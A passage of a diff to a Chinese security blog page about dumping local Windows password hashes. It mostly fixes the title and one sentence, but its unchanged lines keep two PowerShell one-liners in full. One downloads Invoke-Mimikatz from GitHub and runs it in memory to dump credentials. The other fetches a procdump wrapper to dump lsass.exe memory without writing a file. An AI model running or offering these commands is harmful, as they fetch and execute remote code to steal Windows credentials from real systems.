@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>## Windows本地hashdump备忘录 | CoolCat&#39; Blog</title>	
+<title>Windows本地hashdump备忘录 | CoolCat&#39; Blog</title>	
 
 <link rel="stylesheet" href="/styles/main.css">
 <script type="text/javascript">
@@ -152,7 +152,7 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">## Windows本地hashdump备忘录</h1>
+			<h1 class="wow swing entry-title">Windows本地hashdump备忘录</h1>
 <div class="entry-meta">
 <div class="wow bounce">
 	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-02-23 20:21:08" itemprop="datePublished" pubdate="">2020-02-23</time></i>
@@ -229,7 +229,7 @@ window.onload=getCSS();
 <pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
 </code></pre>
 <figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1582480293151.png" alt="" loading="lazy"></figure>
-<p>读一下代码会发现都是peloader做的，比如可以把procdump做成psh实现无文件dump。</p>
+<p>读一下代码会发现都是peloader做的，同理可以把procdump做成psh实现无文件dump。</p>
 <pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot;
 </code></pre>
 <figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1582492124419.png" alt="" loading="lazy"></figure>
